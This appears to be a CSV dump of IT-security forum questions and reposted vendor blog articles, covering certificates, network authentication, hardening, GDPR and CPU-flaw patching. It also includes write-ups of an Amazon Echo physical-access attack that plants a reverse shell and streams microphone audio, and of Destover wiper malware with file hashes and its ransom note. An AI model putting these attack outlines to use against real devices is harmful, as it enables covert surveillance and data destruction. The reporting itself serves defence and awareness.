120950,Self signed certificates vs. third party,"Let me start by saying that I'm not terribly educated about certificates. I've learned more about them in the last hour than I have in the last year. So I've been trying to find technical information about why self signed certificates are supposedly less secure than ones signed by a trusted third party CA. It seems that most of the information surrounding certificates is given by the same authorities that sell the certs. I'm not the kind of person that trusts a business just because they say they have my best interests in mind. I've been burned too many times. My question is this. Are third party certificates more secure that a self signed certificate? If so, the important question for me is why they are. I've found out that man in the middle attacks are a possibility with SSL connections because an attacker could intercept packets between the client and server and insert their own certificate. I'm guessing that a self signed certificate is less secure because in general, websites using self signed certs usually have some type of instructions for accepting the inevitable cert warning (OWA and other employee specific cloud type services) and a user wouldn't notice any difference going to a malicious site because the same warning would occur? Management wants to save money but I want to save my bacon so to speak as well as my employer's if there is a legitimate security concern that needs to be addressed. Please let me know your thoughts. Thanks.",0

They'll pay my mortgage nicely - I've checked. However, they also present to me a bit of a security problem (nothing major on my home network but I like my privacy). I already have WPA2E security on my wireless connections, but as I'm planning on putting Ethernet ports into every room, I'd like the ability to secure them with the same security. I have VLANable switches and will Be VLANing the guest rooms off to their own VLAN (same as with their own wireless SSID - WPA2P) as they will never authenticate to my network but the ports in the communal rooms need securing. If possible I'd like authentication on the communal room ports - if it doesn't get authentication, it gets put on another VLAN - is this possible? If it does get auth, put it on my VLAN. I understand that this is a big ask - if it can't be done then I just want the communal rooms to have full authentication - if it doesn't get authentication it doesn't get network/internet access.Can anybody help me with setting up the NPS server for wired connections? A walkthrough would be amazing - I've already tried setting up the basic auth, but it just lets anything on the network :-PAll my Ethernet devices are Windows 8, I'm running Server 2012 Essentials which has NPS, AD, Cert Services, etc already installed. Many thanks in advance,Bryn",0

1597650,Security flaw in preinstalled software puts Lenovo users at risk,"Researchers have uncovered a flaw in Lenovo's Security Center software that, when exploited, grants attackers system-level access to execute malicious code. Lenovo has issued a patch to the software after learning about it last week, which Lenovo users are advised to apply as soon as possible. ﻿According to ZDNet, ""The affected Lenovo Security Center software allows users to see the overall health of their device, from hardware and software status, network connections, and installed security features."" Lenovo deployed the software l﻿ast week in an update, which users were encouraged to install. After examining the software, researchers at the security firm Trustwave discovered ""a way to raise the privileges, which could let an attacker gain access to the whole system."" This effectively means an attacker could execute code at a system-wide level without alerting the user. Trustwave has yet to publicly announce its findings, but will publish a blog after Lenovo has finished rolling out its patch. ",0

144807,"Looking for a Software to harden Windows machines, anybody?","Hello Everyone,I'm a network administrator of a small/medium network.I'm looking for a software (Free or Not) which can harden Windows Computers (XP And Win7) for the propose of hardening standalone desktop computers (not in domain network).Note: The computers are completely isolated (standalone), so i can't use active directory group policy. moreover, there are too many restriction that i need to apply, so it is not particle to set it up manual (one by one).Basically what I’m looking for is a software that can restrict and disable access for specific user accounts on the system.For Example:1. User john can only open one application and nothing else -- He don’t see no icon on the desktop or start menu, except for one or two applications which i want to allow. He can't Right click on the desktop, the task-bar icons are not shown, there is no folder options, etc...2. User marry can open a specific application and copy data to one folder on D drive.3. User Dan, have access to all drives but cannot install software, and so on...So far ,I've found only the following solutions, but they all seems to miss one or more feature:Desktop restriction Software1. Faronics WINSelect The application seems to answer most of our needs except one feature  which is very important to us but seems to be missing from WINSelect, which is ""restriction per profile"". WINSelect  only allow to set up restrictions which are applied system-wide. If I have multiple user accounts on the system and want to apply different  restrictions for each user, I cant.2. Deskman (No Restriction per user)-> Same thing, no restriction per profile.3. Desktop Security Rx -> not relevant, No Win7 Support.4. The only software that I've found which is offering a restriction per profile is "" 1st Security Agent "". but its GUI is very complicated and not very intuitive.It's worth to mention that I'm not looking for ""Internet Kiosk software"" although they share some features with the one I need. All I need is a software (like http://www.faronics.com/standard/winselect/) that is offering a way to restrict Windows user interface.So IF anybody know an Hardening software which allows to set-up user restrictions on Windows systems, It will be a big, big, big help for me!Thanks to you all",0

2025800,How Secure Is Your Amazon Echo?,"Originally found on www.securityweek.com  Ahhh... The echo (not just a sound reflection you'd hear at summer camp when someone screamed while walking through a canyon anymore). From Prime Day purchases to spur of the moment 2 a.m. shopping sprees, millions have gotten their paws on an Amazon Echo to incorporate into their daily tech filled lives. This ""always listening"" device designed to play music, answer questions via Alexa, and control connected home devices such as WeMo, Hive and Nest. Now researchers have demonstrated that while it listens to you, your attackers could be listening to you as well. Mike Barnes, a researcher at MWR Infosecurity, has published details of an attack that can compromise the device while leaving no evidence of tampering. The attack requires physical physical access, and continues work published last year by researchers from The Citadel, The Military College of South Carolina. The earlier research was looking for potential Echo attack approaches. The paper concludes, ""We believe that any of these approaches would allow further access into the file system of the Echo that would allow security researchers the ability to reverse engineer binaries for vulnerabilities, scan the device for the hardcore credentials, and much more. This is the basis of the approach taken by MWR. In summary, the attack uses the devices' exposed debug pad to watch the boot process and understand the device's configuration. The Echo first attempts to boot from an SD Card attached to the debug pads. ""By correctly formatting a SD Card with X-loader and U-Boot in the correct partition, "" writes Barnes, ""we can boot from this card and into a U-Boot command line interface.""This allowed him to understand the inner workings of the device. He introduced a reverse shell that spawned on boot. He then removed all external evidence of the attack and the Echo rebooted into it's normal operation. However, he was now able to connect remotely with root. Remotely, he was able to create a script ""that would continuously write the raw microphone data into a named fifo pipe which we then stream over TCO/IP to a remote service. On the remote device we receive the raw microphone audio, sample the data and either save it as a wav file or play it out of the speakers of the remote device.""In effect, everything that the Echo hears can now also be heard by attackers without any alteration to the functionality of the Echo or evidence of tampering. The weakness (or difficulty) in the attack is that it requires physical access to the device; but, warns, Barnes, ""it shouldn't be taken for granted that consumers won't expose the devices to uncontrolled environments that places their security and privacy at risk.""He offers several mitigations. The first is to use the physical mute button on the Echo. This will stop it 'listening', but reduces the always-on functionality of the device. The second is to monitor network traffic looking for anomalous traffic. This would be realistic if the Echo is used in the workplace, but no so likely in a home environment. The third option is to always buy direct from Amazon. When MWR disclosed the flaw, Amazon released a statement: ""Customer trust is very important to us. To help ensure the latest safeguards are in place, as a general rule, we recommend customers purchase Amazon devices from Amazon or a trusted retailer and that they keep their software up-to-date.""Amazon has fixed the weakness in the latest version. ""This vulnerability has been confirmed on the 2015 and 2016 edition of the Amazon Echo,"" writes Barnes, ""however the 2017 edition is not vulnerable to this physical attack."" Buying a new device from source will be immune. However, buying an Amazon Echo second-hand could expose users to the potential purchase of a tampered device. If you find one in your hotel room, check that it is a 2017 model. If it is not, switch it to mute when not actively in use. ""What this research highlights,"" says Barnes, ""is the need for manufacturers to think about the physical and digital security risks that the devices may be subjected too and mitigate them at the design and development stage. Whilst Amazon has done a considerable amount to minimize the potential attack surface, these two hardware design choices -- to unprotected debug pads and the hardware configuration setting that allows the device to boot via an external SD card -- could expose consumers to an unnecessary risk.""So, what do you think.... Time to press mute? ",11

I believe we are in a similar era where corporate needs convincing.Specifically looking for real life companies who are not in the lime light, gross under, say $5 mil and are for the most part NOT a focused target, per se' that have been 0wn3d or compromised. We are just a medium sized company. ""Who would want to attack us, asks our President, Finance/IT director and IT manager. We have all heard of Sony Corp and RSA compromises, but what about the SMB's that do not make it to the papers? You know, and I know it doesn't matter! If they, the perpetrators, get a database or website, we can be held hostage, being instructed to pay or it goes to auction. If we refuse to pay, the perpetrator makes our lives miserable by causing all kinds of havoc on our network that THEY control through the computers THEY own via remote control, deleting volmues, partitions, modifying data, redirecting traffic, harvesting account information, Social Security numbers, Credit Card numbers etc. I would like to take a list to my corporate heads where they can compare and say, wow, a trucking company, a hobby store chain and or other agnostic targets have been compromised, had been breached. And this is what it cost them either to get their data back (or so they think) or restore their network from ground up?!I would like to see, perhaps testimonies of, this is where we were and this is what we did to get to where we are now, SECURE! It's not the threat from the outside that is the concern these days, it is what is on the inside of our perimeter that is feeding the outside, PCI information, databases of intellectual property, Human Resource data being leaked, etc. I have an appliance chosen, it holds potential to scour our network, display results that can be actionable for clean up and watch over emerging persistent threats as they morph and change. I need to sell this to my IT Team, managers and corporate before it is approved. It brings little ROI as they conceive an investment. If this is at all familiar to you, but you are not sure you have an answer or a source to provide, please pass this request on to someone you know in the InfoSec community that they may be able to help me and perhaps help us all to be able to leverage our security approach using more sophisticated means, just like when we insisted we needed a firewall and anti-virus at every desktop. Thank you fellow SpiceheadsBrian",0

1643752,5 Ways to Protect your Systems from Exploits,"With the rising tides of ransomware eating up much of the news feeds, we are also being reintroduced to an accompanying friend of malware: exploits. While they are different, the two can seemingly go hand in hand depending on the threat you may have just incurred or behaviors you may be seeing on your system. An exploited machine may not be infected, but it can be leveraged to affect or infect every machine in your environment if the vulnerabilities in the network are not properly controlled.What is an exploit?An exploit is a weakness in an underlying application, application implementation, OS, or other aspect of the machine itself that can affect the system and make it vulnerable. In short, it is a weakness that is leveraged against you. The following should help align where these items fit in the topography of an attack: A vulnerability is a weakness in a piece of your computing infrastructure. Risk is what is incurred due to the vulnerability existing, and it can be mitigated, accepted, or ignored depending on the feasibility that it will be exploited. An exploit is taking advantage of a vulnerability, and thusly causes the business to suffer from exposure due to the exploit being utilized. With computers, there are system-level and application-level exploits that can be used against a machine. For example, a system-level exploit could overtake the RPCSS service via a buffer overflow attack with machines running English Windows 2K, Windows 2003, and Windows NT 4.0 SP3-6a. Meaning machines running these OS versions, the RPCSS service has a weakness that allows commands to exceed the memory allocation for that process and insert commands to run in other memory space.With application exploits, weak code is discovered by checking the source code for vulnerable libraries or through the use of techniques such as fuzzing. Fuzzing is the semi-automated or automated testing technique that takes random or invalid data and runs it through the input of an application, checking the application for unexpected crashes or possible memory leak and buffer overflow vulnerabilities. A few recent attacks have targeted Java applications. Every time an “update Java” prompt is clicked to ignore, you open yourself up to have the Java application exploited by unknown attackers. Many advanced attacks pertaining to exploit kits rely on this method. Clicking on a site that is affected by an EK, like the EC Council Site was, relays the information regarding your down-level Java to their servers, allowing them to send an encrypted package to the machine. This in turn will bypass Java’s security feature, handing the keys of your computer to an attacker.So, in short, an exploit is a hole in your armor that is used against you. The vulnerability is the hole, and the risk is that it is exposed. So, what do you do now?How do you protect yourself from exploits?Just install one application and you are SET! If only it were that easy. Much of the prevention of these kinds of attacks exploiting your systems is knowing your environment and controlling it. There are many technical controls that can be applied to your systems to help prevent them from getting exploited due to vulnerabilities: Patch management – The easiest way to fill a security hole is to take the hole away. Knowing what you are patching is key, as you do not want to take down the entire network. So plan appropriately.  Applying patches regularly helps prevent issues and reduce exposure risk by removing the vulnerabilities that can lead to exploitation. Items like Java, Flash, Adobe, and Microsoft applications, including the operating system, need to be updated regularly. This can be handled via Windows Update Services from an MS server or another third-party application. For UNIX/Linux systems, you can use Chef, Puppet, or a third-party tool like Lumension.   Rate your patching by how critical it is to the business and operations.  If an item cannot be patched, then the business must accept the risk to exploitation. Have a reversion plan in case a patch breaks something. You will always sleep better if an action can be undone in your environment.  Decommissioning older legacy systems – I know some still have that one legacy application that NEEDS the Windows 2000 server to run; however, even having an OS that vulnerable in the infrastructure is not great, especially if you re-use passwords (as many do). Getting access to this machine can wreak havoc, as passwords can be dumped and file-system access can be used if there are any mapped drives.  Review created/homemade/specialty applications – Depending on your business, you may use in-house self-created applications OR have a vendor create applications for you. If this is the case, please ensure that the code used is solid and not able to be exploited. This is where having someone who can interpret the code or create the application in-house would be best. They can then review the code structure to ensure that the application cannot be exploited due to the use of vulnerable components found in the C programming library, such as strlen() (string length)or strcopy() (string copy).  If running Windows Server, review and apply the items located in this Microsoft article pertaining to baseline hardening of the Windows Server OS: https://technet.microsoft.com/en-us/library/cc526440.asp If using Unix/Linux, you can follow this SANS guide to hardening the Linux/Unix OS: https://www.sans.org/media/score/checklists/linuxchecklist.pdf. If predominantly using an OS X site, these few resources, one provided by Apple, though it pertains to the 10.6 builds, can still be followed to apply to newer builds: https://www.apple.com/support/security/guides/.Install security applications on endpoints to protect against them client level network and system level exploitation.  A security product with an IDS/IPS solution will prevent traffic from being exploited like in a MITM (man in the middle) attack or DNS redirect. Having any type of antivirus application normally will stop many attempts at application exploitation via malicious executable code, scanning the obfuscated code or identifying it once the code is exposed at runtime.Preventing your systems from being exploited requires planning and configuration to ensure that the patching will go smoothly and not accidentally bring down aspects of the environment. Using ESET security systems or any system like ours that has an exploit blocker included is one giant recommendation that I would make. The Exploit Blocker technology in the ESET applications monitors existing applications and Microsoft components, ensuring that no malicious behaviors take place. If a detection is triggered due to an application acting suspicious, the threat is blocked immediately with information sent to our Live Grid systems to possibly stop the attack on other systems across the world.Evaluating endpoint security solutions?

672014,Destover: Destructive malware has links to attacks on South Korea,"Yuletide Spicy greetings my friends...More bad buys getting up to no good.  Undoubtedly, you saw some news this week about Backdoor.Detover raising hackles at the FBI.  Our intrepid researchers at the Symantec Security Response team have been digging into it...check it:Destover: Destructive malware has links to attacks on South Korea﻿Some samples of Destover share a C&C server with Volgmer and also share similarities with Jokra and Shamoon.Backdoor.Destover, the destructive malware that was the subject of an FBI Flash Warning this week, shares several links to earlier attacks directed at targets in South Korea. Some samples of Destover report to a command-and-control (C&C) server that was also used by a version of Trojan.Volgmer crafted to attack South Korean targets. The shared C&C indicates that the same group may be behind both attacks.  Volgmer is a targeted piece of malware, likely used by a single group, which has been used in limited attacks, possibly as a first stage reconnaissance tool. It can be used to gather system information and download further files for execution. Significantly, the version of Volgmer which shares a C&C with Destover was configured specifically to attack South Korean targets and will only run on Korean computers.Destover also share some techniques and component names with the Jokra attacks against South Korea in 2013. However there is no hard evidence as yet to link the attacks and a copycat operation can’t be ruled out. Links also exist to the Shamoon Attacks, with both attackers using the same, commercially available drivers. However, in this instance it appears highly unlikely that the same group was behind both attacks and instead it would appear that the Destover attacks copied techniques from Shamoon.  Destover in actionDestover is a particularly damaging form of malware that is capable of completely wiping an infected computer. It was the subject of an FBI Flash Warning earlier this week after at least one variant of it was understood to have been used in a high profile attack.There are several malicious files associated with the FBI Destover report:diskpartmg16.exe (Hash: D1C27EE7CE18675974EDF42D4EEA25C6)net_ver.dat (Hash: 93BC819011B2B3DA8487F964F29EB934)igfxtrayex.exe (Hash: 760c35a80d758f032d02cf4db12d3e55)iissvr.exe (Hash: e1864a55d5ccb76af4bf7a0ae16279ba)Diskpartmg16.exe is the first file that is created on an infected computer and, when executed, it creates the files net_ver.dat and igfxtrayex.exe.When “diskpartmg16.exe” is run, it connects to a number of specific IP addresses within a set IP range, as well as computer names in the format “USSDIX[Machine Name]”. This indicates that this variant of Destover was not intended to be indiscriminate and the malware had instead been configured to only attack computers belonging to one particular organization.The destructive payload of Destover is carried by igfxtrayex.exe. In certain instances, when run, it will:Delete all files on fixed and remote drivesModify the partition tableInstall an additional module(iissvr.exe)Connect to a number of IP addresses on ports 8080 and 8000.Iissvr.exe, meanwhile, is a backdoor which listens on port 80. Once an attacker communicates with the compromised computer, this file displays a message, which reads:“We’ve already warned you, and this is just a beginning.We continue till our request be met.We’ve obtained all your internal data including your secrets and top secrets.If you don’t obey us, we’ll release data shown below to the world.Determine what will you do till November the 24th, 11:00 PM(GMT).Post an email address and the following sentence on your twitter and facebook, and we’ll contact the email address. Thanks a lot to God’sApstls [sic] contributing your great effort to peace of the world.And even if you just try to seek out who we are, all of your data will be released at once.”   “We’ve already warned you, and this is just a beginning.    We continue till our request be met.    We’ve obtained all your internal data including your secrets and top secrets.    If you don’t obey us, we’ll release data shown below to the world.    Determine what will you do till November the 24th, 11:00 PM(GMT).    Post an email address and the following sentence on your twitter and facebook, and we’ll contact the email address.    Thanks a lot to God’sApstls [sic] contributing your great effort to peace of the world.    And even if you just try to seek out who we are, all of your data will be released at once.”Links to VolgmerSome samples of Destover seen by Symantec link to a C&C server that has been used by variants of Trojan.Volgmer in the past. Symantec has been tracking Trojan.Volgmer for several months. Volgmer is a threat capable of opening a back door on an infected computer, which allows the malware to communicate with a C&C server to retrieve system information, execute commands, upload files, and download files for execution.Interestingly, the variants of Volgmer that share a C&C server with Destover are configured to end execution if the compromised computer’s region is not “Korea”.Links to JokraThe Destover attackers use techniques and components that are similar to those used in the Jokra attacks against South Korea in 2013. These attacks crippled servers belonging to several South Korean banks and broadcasting organizations and also defaced the website of a Korean telecoms firm.The malware used in the Jokra attacks contained code that did not begin wiping the hard drive until a set time period expired. Destover is also configured to perform a delayed wipe. Furthermore, media outlets in South Korea have reported that a number of similar file names were used in both attacks.Similarities to Shamoon attacksDestover also share some commonalities with the Shamoon Attacks. Both Destover and the malware used by the Shamoon attackers (W32.Disttrack) share some drivers. These are not malicious files and are commercially available drivers. While both Destover and Disttrack are destructive forms of malware, there is no evidence to suggest that the same group is behind both attacks.Symantec protectionSymantec and Norton products detect this threat as Backdoor.Destover.﻿﻿",0

2108505,IP Camera Setup for multiple users.,"Hello everyone. I had a request by a group of employees that was interesting to me.  I already have pre-existing DVR/ Security Camera Setups (BNC cameras) in the building. However these employees don't have access to it. And for good reason. However, we have a lobby and the request was that each employee. (It's about 20 of them) be able to have access to see a single camera in the lobby, on thier current workstations in a window on thier desktops. It's a windows environment. If I were to do this, I would want to keep that camera separate from everything else. It wouldn't need to record the footage. Just have a live feed. I was thinking an IP camera of some sort. However I wasn't sure if I did that, if cameras would have a limit on how many connections at one time it would be able to handle. I don't generally use IP cameras. As well as if it would have fool-proof software/browser that takes any complication out of pulling the camera up. My employees aren't tech savvy at all. (I basically push shortcuts using GPO to all of thier desktops just to simplify thier jobs, so I don't get silly questions all day long). This also wasn't budgeted at all. So cost is a factor. But does anyone have any recommendations on how to go about accomplishing this? Or recommendations on what kind of camera to use? I said I would look into it. But the systems I have in place now work great. So I would rather just add something that's entirely separate to accomplish this.   Thanks! ",0

1722497,Agile and Secure – Intel’s Approach to Designing World Class Security,"In this new blog, my colleague Steve Grobman shares the approach Intel takes in designing and implementing world class security solutions. With many of the concerns seen in the media around the security of the devices we use, there are often misunderstandings or an incomplete picture of what is being done or how the technology operates. The Intel Management Engine (Intel ME) was the object of one of the more recent cases, and Steve provides some additional context and data that might be helpful to the conversation.He sends a clear message that Intel takes the integrity of its products very seriously. Intel does not put back doors in its products nor do our products give Intel control or access to computing systems without the explicit permission of the end user. In short, Intel does not participate in efforts to decrease security in technology.Here is the approach to designing and implementing world class security for our customers.The design of Intel ME incorporates established industry standards and security best-practices, and delivers tremendous advantages to a variety of computing environments. For example, Intel applies what is called the “least privilege” principle, where users and administrators only have the rights to get their job done. We apply this principle into the design of our processors so each component has the minimum – yet sufficient – privileges it needs to perform a given task, mitigating the chances that attackers could use privileges to access areas they shouldn’t.However, as we are all painfully aware, today’s threat landscape produces countless security challenges every year, targeting systems in a variety of areas. Should an issue arise after a product has shipped, Intel has architected its products with the ability to receive security firmware updates that can counter these issues in the field, allowing for more rapid responses to new exploits and threats.This is possible because the entire industry has adopted a design methodology for application processors that assembles sets of building blocks, each of which has a particular function such as media decoding, manageability or communications. These building blocks are complemented by an embedded microcontroller or processor, which drastically simplifies and shortens development cycles, but more importantly to this topic, it can enable the ability to upgrade and repair a product after it has shipped should an issue arise.These capabilities and protections have made Intel ME a well-known and widely used technology that improves security for our customers, enabling them to better manage, repair and protect computers on their networks.Intel goes to great lengths to validate the security of our products and actively solicit input as part of our validation process. We have a defined set of policies and procedures, and a dedicated team to actively monitor and respond to vulnerabilities identified in released products.We believe our OEM partners and end customers deserve both the agility that firmware updates allow and the protection to safely accomplish whatever they wish to with our technology to keep their devices secure.",0
248411,Unified Threat Management Systems,"Dear esteemed Spiceworks community, Our organization is presently using the Kerio Control 7.2.2 UTM Firewall in our organization. We purchased 400 User licenses and the Kerio UTM software included one free year of Software upgrades as Kerio released them.Our Software maintenance agreement expired and we chose to not renew it for the 2012 Year as Kerio wanted $2200 to reactivate the agreement and the existing version of Kerio UTM software still fit our needs. Therefore we saw no real value added with he newer versions of software that Kerio was releasing and we decided that we would wait until a new version came out that was worth paying for the upgrade. I was recently contacted by a Kerio representative asking if I would like to renew our SWM agreement. I explained that we chose to stay on the existing version we had for one more year and then renew again in 2013. He then informed me that even though we did not upgrade to any of their recent releases we would be back charged once we renewed in 2013 and the price would be now $4400. This was never brought to our attention when we chose the Kerio UTM solution and I think it's an unfair practice. For example we have purchased Microsoft  Office 2007 licenses. We will be upgrading in the Future but we chose to skip Office 2010. Microsoft is going to allow us to upgrade to the newest version and not back charge us for not going with Office 2010. At any rate can any people in the community recommend alternative UTM solutions other than Kerio and if so do they all follow the same practice of forcing you to backpay for older versions of their software if you chose not to renew your software assurance? Regards Franko",0

2171508,Down the rabbit hole: 7 new Mirai botnet variants... and their creator,"Mirai is known, infamously, as the botnet that brought many Internet services to its knees in September 2016 with the biggest DDoS attack in history.Afterwards, the creator (dubbed Anna-Senpai) released the source code, meaning that script kiddies around the world were free to play with it. While the original creators were eventually apprehended, the effects remain.Two years later, variants of the Mirai botnet are still stirring the pot. In July 2018, there was discussion among researchers about some of these new variants, with one user pointing out the researchers had it wrong. That user then went on to post links to the source code of seven Mirai variants. (Our Threat Labs investigated this code -- how different is it from the original? Not much, they say.)The investigation went even deeper... not only into how these variants worked, but who was responsible. The author, thought to be one ""Scarface#1162"" -- even rents access to their botnet as a service.The takeaway here? It's laughably easy for bad actors to create and monetize botnets like this. In a time where many are locking down their laptops and PC's with security, they may also be leaving the front door open with poorly secured IoT devices.“I don’t know what to tell people and IoT security is a joke.”  - WICKED, botnet variant author For the full details and findings, including tidbits about these skiddies, how Mirai works, and more, head over to the Avast Blog.",0

439178,Twitter Spam Bots Target NFL and Miley Cyrus Fans,"﻿Well...I've been in Spiceworks for almost 3 years now...you knew it was coming...at some point... I was going to write about Miley Cirus.The good news is that someone has already done all the writing for me!  Our man Satnam Narang, Security Response Mgr out of L.A., has a great blog about some timely Twitter spam going around right now, capitalizing on Miley & the Super Bowl.  Check it:This week, fans of the Denver Broncos and Seattle Seahawks have been tweeting in anticipation of Super Bowl XLVIII, but many have been subjected to a torrent of spam from Twitter bots. Fans of pop star Miley Cyrus have also been plagued with an identical spam campaign using targeted keywords.Last summer, we published a blog about a similar campaign that focused on the BET Awards and fans of Justin Bieber, One Direction, and Rihanna. The latest campaign follows the same blueprint with improvements.The scam starts with Twitter users tweeting specific keywords which are monitored by spam bots on the service. The keywords could be about the Super Bowl, the Broncos, Seahawks, or individual players on the team, such as Denver Broncos quarterback Peyton Manning or Seattle Seahawks cornerback Richard Sherman. In the case of Miley Cyrus, mentions of her full name or her first name alone may receive a response from spam bots.The response is a tweet with an attached photo that shows the targeted users’ Twitter handle in an effort to personalize the message.These spam bots do not tweet links or include links in their Twitter profiles’ biography section. Instead, they rely on users to manually type the URL found in the picture that was tweeted to them. This is an adaptive measure to ensure that antispam filters do not flag their accounts.Both of the sites that were mentioned in the photos follow the same template. The sites first request a user’s Twitter username, claiming that they need to check the username to confirm eligibility. After that, the site requests the user’s personal information, such as their full name, home and email address. and phone number.Before a user can proceed, the supposed sponsors claim that the user needs to complete a “special offer” in order to have a chance to win the prize. Typically, this leads to a survey, but since this scam is mobile-based, users are asked to install a mobile application, earning the scam operators money for each successful installation through affiliate programs. This incentivizes the scammers to aggressively spam users.The rise in popularity of social networking services over the last few years has encouraged spammers and scammers to target these large pools of users discussing major events and public figures, similar to how marketers do. The question is, which event or public figure will be targeted next?﻿Lots of folks out there plug their mobile devices into their work machines for all kinds of different reasons.  This is just one more thing that can pollute your network and put your infrastructure at risk.STAY VIGILANT!",0

Having zero experience in GDPR, but extensive experience in ISO27001, I'm finding that I'm struggling with getting this company compliant with GDPR for the following reasons; 1) Lack of experience on my part - Contrary to the ICO stating someone with experience, I even mentioned we need to hire a part-time Data Protection Officer in order to achieve compliance, to which I was told ""We don't need to hire one, I am"". 2) Interfering, every time I press ahead with what little I have, it's pushed back and told that it doesn't ""fit in with the company"". 3) The nominated Data Protection Officer has a severe conflict of interest as head of product, so data protection has taken a secondary role, hence why they're not compliant yet. As well as the above, I learnt last week that the head of product is, to paraphrase them, ""I had to fudge the truth a bit about our GDPR compliance"". I'm worried that it'll come back to me, despite myself putting the recommendations in place. Any advice on what I can do?

Rather than relying on Tor's anonymizing network, ExoNet and ExoKey—a pair of devices from a four-year-old Santa Barbara-based startup called x.o.ware—create an encrypted personal virtual private network back to the user's home network to evade eavesdropping on untrusted Wi-Fi networks and secure traffic all the way back to a trusted exit. The result is, in theory, a fully private connection that provides the same level of security and privacy as you'd have working from your own home or business LAN—or, possibly, from one set up somewhere you're less likely to be packet-sniffed. And at just over $100 for the pair (the ExoNet will be $65, and the ExoKey will be $39), they will be price-competitive with some commercial VPN services and probably well worth the time you'd save by not having to configure and administer your own home office VPN.",11

167896,VLAN for Security Camera Feed Doesn't Work,"We just signed a deal to get some security cameras put on the premises by a contractor.  They installed 11 fixed ip cameras powered by a pass through PoE switch that they also provided.  All they needed from me was one port in each gigabit switch in the area of interest to provide connectivity to their PoE switches.  Our LAN has ip addresses of 192.168.1.xxx and 192.168.2.xxx with a subnet mask of 255.255.252.0 and gateway of 192.168.1.254.  As I mentioned above, the cameras are connected to PoE switches that are just pass through switches, and each camera has an ip address of 192.192.0.xxx with a subnet mask of 255.255.255.0. The DVR unit has two NICs - one for LAN (192.168.1.4 / 255.255.252.0 / 192.168.1.254) and one for cameras (192.192.0.200 / 255.255.255.0).I have a mixture of Linksys SRW 2008 manages switches and Trendnet TEG-160WS / TEG-240WS switches in my environment.  I created a VLAN with id 2 and named it Stealth. I added the port from my gigabit switches that was used as the uplink to the contractor's PoE switch in each area to VLAN2, and once they connected their DVR unit, they could not ping any of the cameras.  I played with a few settings, but the only thing I was able to get to work was to take all of those ports off VLAN2 and leave them on VLAN1 like everything else.I don't think it will be an issue to have the video feed coming through the same VLAN as everything else, but I wanted to keep the VLAN for the cameras separate from VLAN1.  Did I mess something up?  Does it have anything to do with the fact that the DVR is not connected to the same network switch that the vendor PoE switch is?  I didn't need to do anything on the gateway router side because everything they brought in was given a fixed ip address.  I am somewhat of a newbie when it comes to VLANs, so I would appreciate any advice / suggestions you might have.  I attached a PDF file for clarity.  ",0

2104349,"""Synchronized Security"" vs separate products?","Got a bit of a debate to get your views on as I'm not sure there's a straight answer on this...In a similar vein to how many wired and wireless vendors ended up with portfolios across both areas it seems security is going a similar way with firewall \ endpoint protection being offered by the same company. Their pitch is that both layers share threat data and therefore you get better management, incident response and protection.On the other hand there's the opposite school of thought to have different sets of eyes looking at the threat landscape i.e. keep your firewall vendor and AV vendor separate and avoid having all your eggs in one basket.Which school of thought do you subscribe too at present? I can see good arguments for both while shopping around for solutions at the moment but interested to see the wider picture.",5
2103907,CPU Flaw Issue...,"Hello everyone, IT Dept of 1 here, trying toget a good handle on the CPU Security Flaw fixes.Just wondering if someone could make sure Ihave the order of things to do, correct - then I have some questions.FYI: We have 7 physical servers (2 areHyper-V Failover Cluster HOST nodes), 5 Hyper-V servers, and about 150workstations. Smallish shop, but still a lot to handle for 1 person (Sys Admin,Net Admin, User Support) – anyway, I digress… From what I can gather, I believe this is theorder for what I am supposed to do:Make sure our Antivirus program is updated onall devices. Since we use Symantec EndPoint Protection v14, we needed an ERASERengine update to v117.3.0.358This appears to have come acrossin the Jan 4, 2018 Virus Def updates, as all my Clients/Servers have the properversion of this engine now. And all Clients/Servers also have the ‘QualityCompat’Registry key set. So we should be good to go here, so that WSUS will show theJan 3 updates as being needed by my systems. (And it does)Approve the Jan 3 updates for allmy systems and let them get installed. (Reboot) *** (See Questions below)After the OS update has been installed, from my understanding, it is not yetactivated because you need to ‘Enable the Fix’ with 2 registry additions (3 ifthe server is a Hyper-V HOST). Is that correct? Then (Reboot) again to applythese reg settings. *** (See Questions below)Obtain the CPU hardware patch (weare 100% Dell shop), so I should get my updates (BIOS) from Dell – update then(Reboot) again. *** (See Questions below)Run the PowerShell Commands for “Get-SpeculationControlSettings”on each system to verify everything is green-lighted on the Clients/Servers Now the questions:If a Client/Server is NOT using(SEPm) antivirus, do I just MANUALLY add the Registry Key so that I get theMeltdown/Spector OS Security patch from WSUS?Once the OS patch is installedautomatically by our GPO for WSUS, (Sundays at 9am), looking at the installedupdates on the system will show PENDING REBOOT (my servers are set to DO NOTAUTO REBOOT AFTER UPDATES INSTALLED). Should I add the 2-3 Registry entriesBEFORE I reboot or just reboot, then add the 2-3 registry keys to Enable the fix,then reboot, then do CPU Code update, then reboot again?Do I ENABLE the OS Fix in theRegistry on Clients/Servers IF I do NOT have the HARDWARE Firmware Code Update availablefrom Dell for the CPU, or ONLY if I have OS *and* HARDWARE patches installed?How do I handle my Hyper-V VMs,there is no HARDWARE code update for these because these have virtual CPUs?They would only get the OS Patch – then would they need to be enabled? *** (SeeQuestion 3 above)If Clients/Servers do not run SEPmAV...Is it ok to MANUALLY put in the ‘QualityCompat’ registry key so that thesystem gets the cpu flaw OS patch from WSUS?Do I need the MicroCode fromINTEL *and* DELL or just Dell BIOS ?What do I do if there is no CPUMicroCode update for a particular Dell Computer? I think I have a number ofsystems that Dell does NOT show as having a BIOS fix for. Do I just install the Jan 3 OSupdates and then Enable it in the registry? Do I just install the Jan 3 OSupdate and NOT add the registry keys to Enable it?I see there are also WSUS updatesfrom Jan 4, Jan 5, Jan 8 – should I apply these at the same time as Jan 3updates? Not sure what the Jan 4, 5, 8 updates deal with other than:Jan 3 is SECURITY UPDATE and CUMULATIVE UPDATE for Win10 and IE. Jan 4, 5, 8 are SECURITY MONTHLY QUALITY UPDATE (do these include the Jan 3patch?)Jan 5 says SECURITY ONLY QUALITYJan 8 is SECURITY MONTHLY QUALITY ROLLUPJan 9 updates came out just lastnight for us, so I wont worry about them until I get through the Jan 3 issuefirst (UNLESS - Is there anything in Jan 9 updates that may be UPDATES to theJan 3-8 issue patches?)Are there any compatibilityissues with any other software programs after Enabling these fixes: like Acronis,Diskeeper, Veritas BackupExec 16, Oracle, etc, etcI heard that the patches on Win10clients had FANUC and/or Rockwell automation software stop workingI guess I just need to know if myservers get the fixes for OS and Hardware, then ENABLED in Registry, that theywill come back up and function normally. (Need reassurance)I can deal with the clients on acase by case basis, if any issues pop up. I just need some reassurance 